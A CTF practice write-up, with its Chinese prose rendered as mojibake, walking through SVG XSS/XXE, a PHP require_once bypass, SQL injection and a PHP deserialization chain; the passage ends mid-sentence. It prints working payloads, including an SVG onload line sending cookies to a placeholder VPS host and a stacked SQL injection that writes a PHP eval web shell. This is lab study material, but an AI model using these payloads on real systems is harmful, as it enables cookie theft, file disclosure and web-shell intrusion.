2019]SVGMagic</h2><p>åšè¿™ä¸ªé¢˜ä¹‹å‰è¦å…ˆçœ‹ä¸€ä¸‹SVGæ˜¯ä»€ä¹ˆ</p><p>SVGç®€ä»‹</p><pre class="language-none"><code class="language-none">SVG(Scalable Vector Graphics)æ˜¯ä¸€ç§åŸºäºXMLçš„äºŒç»´çŸ¢é‡å›¾æ ¼å¼ï¼Œå’Œæˆ‘ä»¬å¹³å¸¸ç”¨çš„jpg&#x2F;pngç­‰å›¾ç‰‡æ ¼å¼æ‰€ä¸åŒçš„æ˜¯SVGå›¾åƒåœ¨æ”¾å¤§æˆ–æ”¹å˜å°ºå¯¸çš„æƒ…å†µä¸‹å…¶å›¾å½¢è´¨é‡ä¸ä¼šæœ‰æ‰€æŸå¤±ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»»ä½•çš„æ–‡æœ¬ç¼–è¾‘å™¨æ‰“å¼€SVGå›¾ç‰‡å¹¶ä¸”ç¼–è¾‘å®ƒï¼Œç›®å‰ä¸»æµçš„æµè§ˆå™¨éƒ½å·²ç»æ”¯æŒSVGå›¾ç‰‡çš„æ¸²æŸ“ã€‚</code></pre><p>åˆ›å»º SVG å›¾åƒ<br>SVG æ–‡æ¡£åŸºæœ¬ç»“æ„</p><p>å¦‚ä¸‹æ‰€ç¤ºï¼Œæ˜¯ä¸€ä¸ª SVG æ–‡æ¡£ç»“æ„ï¼š</p><pre class="language-php" data-language="php"><code class="language-php">&lt;svg width&#x3D;&#39;140&#39; heiight&#x3D;&#39;170&#39; xmlns&#x3D;&#39;http:&#x2F;&#x2F;wwww.w3.org&#x2F;2000&#x2F;svg&#39;&gt;  &lt;title&gt;Cat&lt;&#x2F;title&gt;  &lt;desc&gt;Stick Figure of Cat&lt;&#x2F;desc&gt;  &lt;!-- åœ¨è¿™é‡Œç»˜åˆ¶å›¾åƒ --&gt;&lt;&#x2F;svg&gt;</code></pre><p>æ ¹å…ƒç´ <code>&lt;svg&gt;</code>ä»¥åƒç´ ä¸ºå•ä½å®šä¹‰äº†æ•´ä¸ªå›¾åƒçš„ width å’Œ heightï¼Œè¿˜é€šè¿‡ xmlns å±æ€§å®šä¹‰äº† SVG çš„å‘½åç©ºé—´ã€‚<code>&lt;title&gt;</code> å…ƒç´ çš„å†…å®¹å¯ä»¥è¢«é˜…è¯»å™¨æ˜¾ç¤ºåœ¨æ ‡é¢˜æ ä¸Šæˆ–è€…æ˜¯ä½œä¸ºé¼ æ ‡æŒ‡é’ˆæŒ‡å‘å›¾åƒæ—¶çš„æç¤ºï¼Œ <code>&lt;desc&gt; </code>å…ƒç´ å…è®¸å’±ä»¬ä¸ºå›¾åƒå®šä¹‰å®Œæ•´çš„æè¿°ä¿¡æ¯ã€‚</p><p>åŸºæœ¬å½¢çŠ¶å’Œå±æ€§</p><p>åŸºæœ¬å›¾å½¢</p><p><code>&lt;rect&gt;ã€&lt;circle&gt;ã€&lt;ellipse&gt;ã€&lt;line&gt;ã€&lt;polyline&gt;ã€&lt;polygon&gt;</code></p><p>åŸºæœ¬å±æ€§</p><p>fillã€strokeã€stroke-widthã€transform</p><p>åŸºæœ¬å½¢çŠ¶ --- åœ†å½¢<br><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220711205338279.png" alt="image-20220711205338279"></p><p><strong>SVGé€ æˆXSS</strong></p><p>ä½†æ˜¯å¦‚æœæˆ‘ä»¬åœ¨è¿™é‡Œæ’å…¥ä¸€ä¸ªxss</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220711205545773.png" alt="image-20220711205545773"></p><p>å¯ä»¥çœ‹åˆ°ä¹Ÿèƒ½æ‰§è¡Œ</p><p><strong>åŸå› </strong></p><pre class="language-none"><code class="language-none">è¿™æ˜¯å› ä¸ºSVGæ˜¯æ”¯æŒé€šè¿‡è„šæœ¬è¯­è¨€æ¥åŠ¨æ€è®¿é—®å’Œä¿®æ”¹SVGçš„ä»»ä½•å†…å®¹ï¼Œè¿™ç‚¹å’ŒHTMLä¸­çš„DOMç±»ä¼¼ï¼Œæˆ–è€…è¯´å®Œå…¨ä¸€è‡´ã€‚å› ä¸ºSVGä¸­çš„æ‰€æœ‰æ ‡ç­¾å’Œå±æ€§éƒ½å·²ç»å¯¹åº”äº†å·²ç»å®šä¹‰çš„DOMï¼Œè€Œè¿™ç§è„šæœ¬è¯­è¨€å°±æ˜¯JavaScriptï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨SVGä¸­æ’å…¥JavaScriptè„šæœ¬æ˜¯å®Œå…¨èƒ½å¤Ÿè¢«è§£æçš„ã€‚åœ¨å›½é™…çš„SVGæ ‡å‡†ä¸­å®šä¹‰äº†scriptæ ‡ç­¾çš„å­˜åœ¨ï¼Œæ€»ä¹‹XSSä¹‹æ‰€ä»¥èƒ½å¤Ÿæ‰§è¡Œæ˜¯å› ä¸ºéµå¾ªäº†svgåŠxmlçš„æ ‡å‡†ã€‚</code></pre><p>æ‰€ä»¥å¯ä»¥ç”¨</p><p><code>&lt;svg/onload=&quot;document.location=&#39;http://vps-ip:1234&#39;+document.cookie&quot;&gt;</code></p><p>è¿™ç§payloadå®ç°ç›—å–ç®¡ç†å‘˜cookieçš„ç›®çš„</p><p><strong>SVGé€ æˆXXE</strong></p><p>å› ä¸ºSVGæ˜¯ä¸€ç§ç”¨<a href="https://so.csdn.net/so/search?q=XML&spm=1001.2101.3001.7020">XML</a>å®šä¹‰çš„è¯­è¨€</p><p>æ‰€ä»¥è¿™ä¸ªä¹Ÿå­˜åœ¨ç€xxeçš„æ¼æ´</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220711212326994.png" alt="image-20220711212326994"></p><p>è¿™é‡Œå°±ä¼šè¿”å›ä¸€ä¸ªå¸¦ç€passwdæ–‡ä»¶å†…å®¹çš„å›¾ç‰‡ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹å›¾ç‰‡å®½åº¦æ¥çœ‹åè¾¹çš„éƒ¨åˆ†</p><p>åè¾¹å°±æ˜¯çŒœflagæ–‡ä»¶çš„éƒ¨åˆ†äº†ï¼Œflagæ–‡ä»¶åä¸ºflag.txtï¼Œä¸”åœ¨å½“å‰ç›®å½•ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸çŸ¥é“æˆ‘ä»¬å½“å‰çš„ç›®å½•</p><p>è¿™é‡Œå¯ä»¥ç”¨/proc/self/cwdæ¥è·å–ç›®æ ‡å½“å‰è¿›ç¨‹ç¯å¢ƒçš„è¿è¡Œç›®å½•ä¸ç›®å½•é‡Œçš„æ–‡ä»¶</p><p>æ‰€ä»¥æœ€ç»ˆçš„payloadä¸º</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220711213049790.png" alt="image-20220711213049790"></p><p>å‚è€ƒæ–‡ç« ï¼š</p><p><a href="https://blog.csdn.net/qq_38154820/article/details/110152943">æµ…è°ˆSVGçš„ä¸¤ä¸ªé»‘é­”æ³•_åˆå¤©ç½‘å®‰å®éªŒå®¤çš„åšå®¢-CSDNåšå®¢</a></p><h2 id="WMCTF2020-Make-PHP-Great-Again"><a href="#WMCTF2020-Make-PHP-Great-Again" class="headerlink" title="[WMCTF2020]Make PHP Great Again"></a>[WMCTF2020]Make PHP Great Again</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);require_once &#39;flag.php&#39;;if(isset($_GET[&#39;file&#39;])) &#123;  require_once $_GET[&#39;file&#39;];&#125;</code></pre><p>è¿™é¢˜çš„è€ƒç‚¹å°±æ˜¯require_onceçš„ç»•è¿‡ï¼Œè¿™ä¸ªå‡½æ•°æ‰€åŒ…å«çš„æ–‡ä»¶åªèƒ½è¢«åŒ…å«ä¸€æ¬¡ï¼Œè¿™æ ·çš„è¯æˆ‘ä»¬å°±ä¸èƒ½ç›´æ¥ç”¨ä¼ªåè®®æ¥å†åŒ…å«ä¸€æ¬¡flag.phpäº†</p><pre class="language-none"><code class="language-none">phpçš„æ–‡ä»¶åŒ…å«æœºåˆ¶æ˜¯å°†å·²ç»åŒ…å«çš„æ–‡ä»¶ä¸æ–‡ä»¶çš„çœŸå®è·¯å¾„æ”¾è¿›å“ˆå¸Œè¡¨ä¸­ï¼Œå½“å·²ç»require_once(&#39;flag.php&#39;)ï¼Œå·²ç»includeçš„æ–‡ä»¶ä¸å¯ä»¥å†require_onceã€‚</code></pre><p>åœ¨è¿™é‡Œæœ‰ä¸ªå°çŸ¥è¯†ç‚¹ï¼Œ<code>/proc/self</code>æŒ‡å‘å½“å‰è¿›ç¨‹çš„<code>/proc/pid/</code>ï¼Œ<code>/proc/self/root/</code>æ˜¯æŒ‡å‘<code>/</code>çš„ç¬¦å·é“¾æ¥ï¼Œæƒ³åˆ°è¿™é‡Œï¼Œç”¨ä¼ªåè®®é…åˆå¤šçº§ç¬¦å·é“¾æ¥çš„åŠæ³•è¿›è¡Œç»•è¿‡ï¼Œpayload:</p><pre class="language-none"><code class="language-none">php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php </code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220711213946435.png" alt="image-20220711213946435"></p><p>ä½†æ˜¯è¿™ä¸ªéœ€è¦çŸ¥é“å½“å‰ç›®å½•ï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®ä¸Šä¸€é¢˜æåˆ°çš„çŸ¥è¯†æ”¹è¿›ä¸€ä¸‹</p><pre class="language-none"><code class="language-none">php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;flag.php </code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220711214145577.png" alt="image-20220711214145577"></p><p>åŸç†å¯ä»¥å»çœ‹è¿™ä¸ª</p><p><a href="https://www.anquanke.com/post/id/213235#h2-8">phpæºç åˆ†æ require_once ç»•è¿‡ä¸èƒ½é‡å¤åŒ…å«æ–‡ä»¶çš„é™åˆ¶ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p><h2 id="FireshellCTF2020-Caas"><a href="#FireshellCTF2020-Caas" class="headerlink" title="[FireshellCTF2020]Caas"></a>[FireshellCTF2020]Caas</h2><p>å¼€å±€ä¸€ä¸ªå¤§è¾“å…¥æ¡†</p><p>è¦æ±‚æˆ‘ä»¬è¾“å…¥ä»£ç è¿›è¡Œç¼–è¾‘ï¼Œçœ‹æŠ¥é”™èƒ½çŒœå‡ºæ¥è¿™æ˜¯cçš„æ–‡ä»¶</p><p>ç„¶åæ˜¯åˆ©ç”¨äº†#include &quot;&quot;é¢„å¤„ç†ç¼–è¯‘æŠ¥é”™</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220714132332448.png" alt="image-20220714132332448"></p><p>é€šè¿‡æŠ¥é”™å¯ä»¥æŠŠincludeçš„æ–‡ä»¶å†…å®¹è¾“å‡ºå‡ºæ¥</p><h2 id="October-2019-Twice-SQL-Injection"><a href="#October-2019-Twice-SQL-Injection" class="headerlink" title="October 2019 Twice SQL Injection"></a>October 2019 Twice SQL Injection</h2><p>è¿™ä¸ªäºŒæ¬¡æ³¨å…¥å°±æ˜¯åœ¨æ³¨å†Œçš„æ—¶å€™æŠŠæ³¨å…¥è¯­å¥ä½œä¸ºusernameå°±è¡Œ</p><p>å…¶ä»–çš„åŠŸèƒ½åŸºæœ¬ä¸Šæ²¡å•¥ç”¨</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220714134524580.png" alt="image-20220714134524580"></p><pre class="language-txt" data-language="txt"><code class="language-txt">username &#x3D;1&#39; union select database() #username &#x3D;1&#39; union select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;ctftraining&#39; # username &#x3D;1&#39; union select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39;# &#x2F;*è¿™é‡Œå¯ä»¥ç›´æ¥ username &#x3D;1&#39; union select * from flag # *&#x2F;username &#x3D;1&#39; union select flag from flag #</code></pre><h2 id="SUCTF-2018-MultiSQL"><a href="#SUCTF-2018-MultiSQL" class="headerlink" title="[SUCTF 2018]MultiSQL"></a>[SUCTF 2018]MultiSQL</h2><p>sqlçš„é¢„å¤„ç†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220714161112201.png" alt="image-20220714161112201"></p><p>è¿™é‡Œæœ‰ä¸¤ä¸ªæ³¨å…¥ç‚¹</p><p>ä¸€ä¸ªæ˜¯æ³¨å†Œçš„åœ°æ–¹å¯¹ç”¨æˆ·åæœ‰ä¸€ä¸ªè¿‡æ»¤ï¼Œåº”è¯¥æ˜¯å¯ä»¥äºŒæ¬¡æ³¨å…¥çš„</p><p>è¿˜ä¸€ä¸ªæ˜¯åœ¨ç™»å½•åçš„idçš„ä½ç½®ï¼Œæœ‰ä¸ªæ•°å­—å‹çš„ç›²æ³¨ï¼Œè¿™ä¸ªè¿˜èƒ½é€ æˆè¶Šæƒè®¿é—®ï¼Œä¸è¿‡æ²¡å•¥ç”¨</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220714161354408.png" alt="image-20220714161354408"></p><p>é¢˜ç›®æœ¬èº«æœ‰ä¸€äº›è¿‡æ»¤ï¼Œç”¨<code>id=1^(if(ascii(mid(user(),1,1))&gt;0,0,1))</code>å¼‚æˆ–çš„æ–¹å¼æ¥åˆ¤æ–­æ³¨å…¥ç‚¹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220714162007822.png" alt="image-20220714162007822"></p><p>è¿™é‡Œå‘¢è¿‡æ»¤äº†unionï¼Œselect ï¼Œ&amp;ï¼Œ|</p><p>ä¸è¿‡flagä¹Ÿä¸åœ¨æ•°æ®åº“é‡Œï¼Œè¿™é‡Œæ˜¯è¦æ±‚ç”¨outfileå†™æ–‡ä»¶è¿›å»ï¼Œå¯å†™çš„è·¯å¾„æ˜¯/var/www/html/favicon/ç›®å½•ä¸‹ï¼Œè¿™æ˜¯å› ä¸ºæœ‰ä¸ªä¿®æ”¹å¤´åƒçš„åŠŸèƒ½ï¼Œä¸Šä¼ çš„å¤´åƒå°±åœ¨è¿™ä¸ªç›®å½•ä¸‹</p><p>ä¸æƒ³å†™äº†ï¼Œå·ä¸ªä»£ç </p><pre class="language-python" data-language="python"><code class="language-python">str&#x3D;&quot;select &#39;&lt;?php eval($_POST[_]);?&gt;&#39; into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;favicon&#x2F;shell.php&#39;;&quot;len_str&#x3D;len(str)for i in range(0,len_str):if i &#x3D;&#x3D; 0:print(&#39;char(%s&#39;%ord(str[i]),end&#x3D;&quot;&quot;)else:print(&#39;,%s&#39;%ord(str[i]),end&#x3D;&quot;&quot;)print(&#39;)&#39;)</code></pre><p>ç„¶åå€ŸåŠ©å †å æ³¨å…¥å’Œé¢„å¤„ç†æ–¹å¼</p><p>æœ€ç»ˆpayloadä¸º</p><pre class="language-txt" data-language="txt"><code class="language-txt">?id&#x3D;1;set @sql&#x3D;char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,95,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59);prepare query from @sql;execute query;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220714165313730.png" alt="image-20220714165313730"></p><h2 id="EIS-2019-EzPOP"><a href="#EIS-2019-EzPOP" class="headerlink" title="[EIS 2019]EzPOP"></a>[EIS 2019]EzPOP</h2><p>å¥½éš¾çš„é“¾å­ï¼Œåšè¿™ä¸ªä¹‹å‰æœ¬æ¥ä»¥ä¸ºè‡ªå·±çš„ååºåˆ—åŒ–æ°´å¹³è¿˜å¯ä»¥äº†ï¼Œä¸è¿‡ç°åœ¨çœ‹èµ·æ¥ä¹Ÿå°±é‚£æ ·äº†hhhh</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);class A &#123;    protected $store;    protected $key;    protected $expire;    public function __construct($store, $key &#x3D; &#39;flysystem&#39;, $expire &#x3D; null) &#123;        $this-&gt;key &#x3D; $key;        $this-&gt;store &#x3D; $store;        $this-&gt;expire &#x3D; $expire;    &#125;    public function cleanContents(array $contents) &#123;        $cachedProperties &#x3D; array_flip([            &#39;path&#39;, &#39;dirname&#39;, &#39;basename&#39;, &#39;extension&#39;, &#39;filename&#39;,            &#39;size&#39;, &#39;mimetype&#39;, &#39;visibility&#39;, &#39;timestamp&#39;, &#39;type&#39;,        ]);        foreach ($contents as $path &#x3D;&gt; $object) &#123;            if (is_array($object)) &#123;                $contents[$path] &#x3D; array_intersect_key($object, $cachedProperties);            &#125;        &#125;        return $contents;    &#125;    public function getForStorage() &#123;        $cleaned &#x3D; $this-&gt;cleanContents($this-&gt;cache);        return json_encode([$cleaned, $this-&gt;complete]);    &#125;    public function save() &#123;        $contents &#x3D; $this-&gt;getForStorage();        $this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire);    &#125;    public function __destruct() &#123;        if (!$this-&gt;autosave) &#123;            $this-&gt;save();        &#125;    &#125;&#125;class B &#123;    protected function getExpireTime($expire): int &#123;        return (int) $expire;    &#125;    public function getCacheKey(string $name): string &#123;        return $this-&gt;options[&#39;prefix&#39;] . $name;    &#125;    protected function serialize($data): string &#123;        if (is_numeric($data)) &#123;            return (string) $data;        &#125;        $serialize &#x3D; $this-&gt;options[&#39;serialize&#39;];        return $serialize($data);    &#125;    public function set($name, $value, $expire &#x3D; null): bool&#123;        $this-&gt;writeTimes++;        if (is_null($expire)) &#123;            $expire &#x3D; $this-&gt;options[&#39;expire&#39;];        &#125;        $expire &#x3D; $this-&gt;getExpireTime($expire);        $filename &#x3D; $this-&gt;getCacheKey($name);        $dir &#x3D; dirname($filename);        if (!is_dir($dir)) &#123;            try &#123;                mkdir($dir, 0755, true);            &#125; catch (\Exception $e) &#123;                &#x2F;&#x2F; åˆ›å»ºå¤±è´¥            &#125;        &#125;        $data &#x3D; $this-&gt;serialize($value);        if ($this-&gt;options[&#39;data_compress&#39;] &amp;&amp; function_exists(&#39;gzcompress&#39;)) &#123;            &#x2F;&#x2F;æ•°æ®å‹ç¼©            $data &#x3D; gzcompress($data, 3);        &#125;        $data &#x3D; &quot;&lt;?php\n&#x2F;&#x2F;&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\n exit();?&gt;\n&quot; . $data;        $result &#x3D; file_put_contents($filename, $data);        if ($result) &#123;            return true;        &#125;        return false;    &#125;&#125;if (isset($_GET[&#39;src&#39;]))&#123;    highlight_file(__FILE__);&#125;$dir &#x3D; &quot;uploads&#x2F;&quot;;if (!is_dir($dir))&#123;    mkdir($dir);&#125;unserialize($_GET[&quot;data&quot;]);</code></pre><p>åˆ©ç”¨ç‚¹æ˜¯å¾ˆæ˜æ˜¾çš„</p><p>Bç±»é‡Œçš„setæ–¹æ³•é‡Œè°ƒç”¨äº†ä¸€ä¸ªfile_put_contentsï¼Œç„¶åä¸¤ä¸ªå‚æ•°åœ¨ä¸€å®šç¨‹åº¦ä¸Šæ˜¯å¯æ§çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¥å†™é©¬</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220714225843677.png" alt="image-20220714225843677"></p><p><strong>æˆ‘ä»¬å…ˆæ¥çœ‹dataå‚æ•°</strong></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220714230047933.png" alt="image-20220714230047933"></p><p>å¯ä»¥çœ‹åˆ°dataå‚æ•°åœ¨å°†valueå‚æ•°ä½œä¸ºserializeæ–¹æ³•çš„å‚æ•°è°ƒç”¨åï¼Œå°†serializeæ–¹æ³•çš„è¿”å›å€¼è¿›è¡Œäº†æ‹¼æ¥ï¼Œæœ€ç»ˆæˆä¸ºäº†æˆ‘ä»¬å†™å…¥çš„å†…å®¹</p><p>è¿™é‡Œæ˜¯serizalizeæ–¹æ³•çš„å†…å®¹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220714230354313.png" alt="image-20220714230354313"></p><p>å°±æ˜¯å°†serializeèµ‹æˆä¸€ä¸ªå‡½æ•°ï¼Œå†æ‰§è¡Œä¸€ä¸‹å°†å…¶è¿”å›</p><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥è®©options[&#39;serialize&#39;]=trimï¼Œè¿™æ ·è¿”å›çš„å€¼åªä¼šå»æ‰é¦–å°¾çš„ç©ºæ ¼ï¼Œå†…å®¹ä¸å˜</p><p>æ‰€ä»¥è¿™é‡Œdataçš„å€¼å°±æ˜¯$valueï¼Œè€Œ$valueæ˜¯ä½œä¸ºsetæ–¹æ³•é‡Œçš„ä¸€ä¸ªå‚æ•°å‡ºç°çš„</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220714231215057.png" alt="image-20220714231215057"></p><p>å¦å¤–è¦æ³¨æ„åˆ«è®©æ•°æ®å‹ç¼©</p><p>ä¹Ÿå°±æ˜¯è®©$this-&gt;options[&#39;data_compress&#39;] = false;</p><p>è€Œè¦è°ƒç”¨setæ–¹æ³•å°±è¦çœ‹Aç±»é‡Œçš„saveæ–¹æ³•äº†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220714231306819.png" alt="image-20220714231306819"></p><p>ç„¶åè¿™é‡Œè¿˜è°ƒç”¨äº†getForStorageï¼Œå°†getForStorageçš„è¿”å›å€¼å½“ä½œ$contentsï¼Œä¹Ÿå°±æ˜¯setä¸­çš„$valueï¼ŒgetForStorageä¸­è¿˜é€šè¿‡cleanContentsæ¥å¯¹cleanedçš„å€¼è¿›è¡Œäº†è¿‡æ»¤</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220714231425923.png" alt="image-20220714231425923"></p><p>åœ¨è¿™é‡Œå¯ä»¥ä»¤cache=array()ï¼Œè¿™æ ·å°±èƒ½ä¿è¯contentsçš„ä»…ä»…æ˜¯completeè¿™ä¸ªå˜é‡çš„å†…å®¹äº†</p><p>è€Œä¸ºäº†å®ç°è°ƒç”¨saveå‚æ•°çš„ç›®çš„ï¼Œæˆ‘ä»¬è¦çœ‹ååºåˆ—åŒ–çš„å…¥å£<img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220714232051375.png" alt="image-20220714232051375"></p><p>è®©autosave=false</p><pre class="language-txt" data-language="txt"><code class="language-txt">ç»è¿‡ä¸Šé¢çš„åˆ†æï¼Œæˆ‘ä»¬å·²çŸ¥çš„è¦å®šä¹‰çš„å†…å®¹æœ‰autosave&#x3D;falsecomplete&#x3D;payloadcache&#x3D;array()options[&#39;serialize&#39;]&#x3D;trim$this-&gt;store &#x3D; new B()$this-&gt;options[&#39;data_compress&#39;] &#x3D; false;</code></pre><p><strong>ç„¶åå†æ¥çœ‹filenameéƒ¨åˆ†</strong></p><p>filenameæ˜¯ç»è¿‡getCacheKeyå‡½æ•°æ‹¼æ¥åçš„ç»“æœï¼Œæˆ‘ä»¬å¯ä»¥è®©</p><p>options[&#39;prefix&#39;]=shell ç„¶åè®©name=.phpï¼Œä¸€æ ·å¯ä»¥è¾¾åˆ°å†™å…¥phpé©¬çš„ç›®çš„</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220714232546060.png" alt="image-20220714232546060"></p><p>æ¥ä¸‹æ¥å°±è¦çœ‹nameçš„æ¥æºäº†</p><p>è¿™åŒæ ·æ˜¯setçš„ä¸€ä¸ªå½¢å‚ï¼Œæ˜¯Aç±»ä¸­keyå˜é‡çš„å€¼ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å¯¹å…¶èµ‹å€¼</p><p>è¿™éƒ¨åˆ†æˆ‘ä»¬å®šä¹‰çš„å‚æ•°å¯ä»¥ä¸º</p><pre class="language-php" data-language="php"><code class="language-php">options[&#39;prefix&#39;]&#x3D;shellkey &#x3D; .php</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220715001039395.png" alt="image-20220715001039395"></p><p>è°ƒè¯•ä¸€ä¸‹å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„é“¾å­æ˜¯æ­£ç¡®çš„</p><p>ç„¶åæˆ‘ä»¬éœ€è¦åšçš„éƒ¨åˆ†æ˜¯ç»•è¿‡dataé‡Œçš„exit()å‡½æ•°ï¼Œå› ä¸º</p><p><code>$data = &quot;&lt;?php\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\n exit();?&gt;\n&quot; . $data;</code></p><p>è¿™ä¸ªæ ¼å¼åŒ–è¾“å‡ºå›ºå®šäº†é•¿åº¦ä¸º12çš„æ•°å€¼ï¼Œä¸èƒ½å†™å…¥æˆ‘ä»¬çš„shell</p><p>è¿™é‡Œå°±è¦åˆ©ç”¨pç‰›è®²è¿‡çš„åˆ©ç”¨ä¼ªåè®®çš„base64ç ´ååŸæœ‰çš„phpå†…å®¹çš„æ–¹å¼äº†</p><blockquote><p>ç”±äº&lt;ã€?ã€()ã€;ã€&gt;ã€\néƒ½ä¸æ˜¯base64ç¼–ç çš„èŒƒå›´ï¼Œæ‰€ä»¥base64è§£ç çš„æ—¶å€™ä¼šè‡ªåŠ¨å°†å…¶å¿½ç•¥ï¼Œæ‰€ä»¥è§£ç 